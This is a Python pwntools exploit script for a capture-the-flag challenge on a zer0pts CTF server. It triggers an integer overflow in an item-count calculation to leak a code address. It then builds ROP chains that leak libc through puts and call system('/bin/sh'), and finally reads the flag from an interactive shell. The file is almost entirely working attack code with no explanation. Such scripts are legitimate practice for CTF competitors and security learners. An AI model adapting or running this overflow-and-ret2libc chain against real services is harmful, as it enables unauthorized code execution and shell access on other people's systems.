#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn1.ctf.zer0pts.com', 9001
binary = './challmod'
brkpts = '''
b calc_total
c
'''

elf = ELF("chall")
libc = ELF("./libc-2.31.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

def brute(val, upper):
    while (val // upper) & 0xfffff != 0x00b6c:
        val += (2**32)
        if val > ((0xffff << 32) + 1):
            return -1

    return val // upper

def exploit(io):
    N = 0x2000000000000000

    sla("items: ", str(N))

    reu("Total: $")
    
    leak = u64(p64(int(rl().strip()), signed = True)) & 0xffffffff
    log.info("leak -> "+hex(leak))

    code_base = brute(leak, 0x557f) + (0x557f << 32) - 0xb6c
    assert code_base & 0xfff == 0x0, "LEAK FAILED!"
    log.info("code_base @ "+hex(code_base))

    pop_rdi = code_base + 0xd53
    puts_plt = code_base + elf.plt['puts']
    puts_got = code_base + elf.got['puts']
    main = code_base + elf.symbols['main']
    ret = code_base + 0x7be

    rop = [
        pop_rdi, puts_got, puts_plt, main
    ]

    sla("[1=Yes] ", "1")

    for i in range(len(rop)):
        sla(": ", str(i+11))
        sla("$", str(rop[i] & 0xffffffff))
        sla(": ", str(rop[i] >> 32))
    
    sla(": ", "-1")
    rl()
    rl()
    libc.address = uu64(re(6)) - libc.symbols['puts']

    log.info("libc @ "+hex(libc.address))

    N = 0x2000000000000000

    sla("items: ", str(N))

    rop = [
        pop_rdi, next(libc.search("/bin/sh")), ret, libc.symbols['system']
    ]

    sla("[1=Yes] ", "1")

    for i in range(len(rop)):
        sla(": ", str(i+11))
        sla("$", str(rop[i] & 0xffffffff))
        sla(": ", str(rop[i] >> 32))

    sla(": ", "-1")
    rl()
    rl()

    sl("cat flag*")

    io.interactive()

if __name__ == "__main__":
    while True:
        # io = process(binary, env = {"LD_PRELOAD" : "./libc-2.31.so"})
        io = remote(remote_ip, port)
        try:
            exploit(io)
        except:
            io.close()
    # exploit(io)


